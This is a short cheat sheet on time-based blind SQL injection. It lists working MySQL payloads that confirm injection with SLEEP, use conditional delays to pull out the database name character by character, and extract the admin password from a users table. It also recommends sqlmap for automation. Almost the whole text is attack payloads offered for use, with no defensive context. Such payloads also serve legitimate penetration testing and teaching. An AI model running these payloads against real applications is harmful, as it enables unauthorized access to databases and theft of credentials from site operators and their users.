Time-Based Injection Techniques

  • Test for injection: 
    1; SELECT SLEEP(5)--
    If the response takes ~5 seconds, you can inject time-based payloads.
  • Conditional delay: 
    1 AND IF(SUBSTRING(DATABASE(),1,1)='s', SLEEP(5), 0)--
    If the database name starts with 's', you'll see a 5-second delay.
  • Extract the database name character by character: 
    1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>100, SLEEP(3), 0)--
1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>110, SLEEP(3), 0)--
1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>115, SLEEP(3), 0)--
    Use binary search to find each character's ASCII value efficiently.
  • Extract from a specific table: 
    1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--

Patience required! Time-based injection is slow — each character requires multiple requests. Consider using sqlmap --technique=T for automation.
